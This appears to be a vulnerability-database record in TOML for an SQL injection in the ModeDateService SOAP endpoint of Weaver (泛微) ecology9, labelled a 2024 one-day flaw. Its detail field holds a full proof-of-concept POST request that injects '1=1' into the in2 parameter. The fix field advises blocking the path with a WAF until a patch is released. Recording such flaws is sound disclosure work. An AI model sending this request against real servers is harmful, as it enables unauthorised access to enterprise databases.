docs/2024/泛微_泛微ecology9系统接口modedateservice存在sql漏洞.toml

vendor = "泛微"
name = "泛微ecology9系统接口ModeDateService存在SQL漏洞"
type = "SQL注入"
version = "未知"
path = "/services/ModeDateService"
detail = "POST /services/ModeDateService HTTP/1.1 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 Referer: http://xxx//services/Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Cookie: ecology_JSessionid=aaasJ-HspHcxI5r2Krufz; JSESSIONID=aaasJ-HspHcxI5r2Krufz Connection: close SOAPAction: Content-Type: text/xml;charset=UTF-8 Host: xxx Content-Length: 405 <soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:mod=\"http://localhost/services/ModeDateService\"> <soapenv:Header/> <soapenv:Body> <mod:getAllModeDataCount> <mod:in0>1</mod:in0> <mod:in1>1</mod:in1> <mod:in2>1=1</mod:in2> <mod:in3>1</mod:in3> </mod:getAllModeDataCount> </soapenv:Body> </soapenv:Envelope>"
fix = "WAF封禁路路径，等待发布补丁"
date = "0826"
label = "1day"
